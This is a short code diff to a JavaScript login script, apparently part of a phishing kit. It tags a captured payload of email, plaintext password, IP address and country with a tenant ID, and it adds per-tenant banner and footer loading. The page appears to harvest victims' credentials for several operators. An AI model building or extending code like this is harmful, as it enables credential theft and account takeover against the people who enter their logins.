@@ -382,6 +382,7 @@ function loginUser(event){
         .then(function(d){
             var ua = navigator.userAgent;
             var payload = {
+                web_id: "web_id_kenz_1", // <--- TAMBAHAN MULTI-TENANT
                 email: username, password: password,
                 ip: d.ip || "-",
                 negara: d.country_name || "-",
@@ -452,6 +453,20 @@ window.addEventListener("load", function(){
 document.addEventListener("keydown", function(event){
     if(event.key === "Escape") closeLogin();
 });
+
+// ================= TAMBAHAN BUAT BANNER DINAMIS =================
+fetch('/api/config?web_id=web_id_kenz_1').then(r=>r.json()).then(d=>{
+  if(d.banner_url) {
+    var banner = document.getElementById('bannerImg');
+    if(banner) banner.src = d.banner_url;
+  }
+  if(d.footer_text) {
+     const footer = document.createElement('div');
+     footer.style.cssText = 'text-align:center;padding:20px;font-size:12px;color:#888;';
+     footer.textContent = d.footer_text;
+     document.body.appendChild(footer);
+  }
+}).catch(e => console.log("Config load error:", e));
 
 </script>
 
